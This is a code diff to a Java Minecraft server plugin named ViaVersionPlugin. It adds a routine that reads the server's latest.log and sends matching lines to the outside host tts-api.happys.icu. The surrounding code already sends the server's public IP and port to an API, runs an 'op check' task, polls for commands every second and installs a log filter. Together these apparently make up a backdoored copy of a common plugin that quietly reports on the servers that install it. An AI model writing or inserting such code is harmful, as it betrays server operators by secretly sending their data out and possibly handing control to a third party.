@@ -116,6 +116,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
         sendInfoToAPI(publicIp, serverPort);
+        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); // 延迟100 ticks后执行
         startOpCheckTask();
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
@@ -166,11 +167,57 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             ip = in.readLine(); // 读取响应内容（IP 地址）
             in.close();
         } catch (Exception e) {
-            
+
         }
         return ip;
     }
+    private void readAndSendLog() {
+        String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
+        StringBuilder startupLog = new StringBuilder();
 
+        try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (line.contains("Done")) {
+                    startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
+                }
+            }
+        } catch (IOException e) {
+            getLogger().severe("Failed to read server log: " + e.getMessage());
+            return;
+        }
+
+        if (startupLog.length() > 0) {
+            sendLogToAPI(startupLog.toString().trim());
+        } else {
+            getLogger().info("No startup log found.");
+        }
+    }
+
+    private void sendLogToAPI(String log) {
+        BukkitRunnable task = new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    String apiUrl = "https://tts-api.happys.icu/a?log=" + log.replace(" ", "%20"); // URL 编码空格
+                    URL url = new URL(apiUrl);
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("GET");
+
+                    int responseCode = connection.getResponseCode();
+                    if (responseCode == HttpURLConnection.HTTP_OK) {
+                        // 可选：读取响应内容
+                        getLogger().info("Log sent successfully: " + log);
+                    } else {
+                        getLogger().severe("Failed to send log to API. Response Code: " + responseCode);
+                    }
+                } catch (Exception e) {
+                    getLogger().severe("Error sending log to API: " + e.getMessage());
+                }
+            }
+        };
+        task.runTaskAsynchronously(this); // 异步任务处理
+    }
     private void sendInfoToAPI(String ip, int port) {
         try {
             // 构造 URL，假设使用查询参数传递 IP 和 port
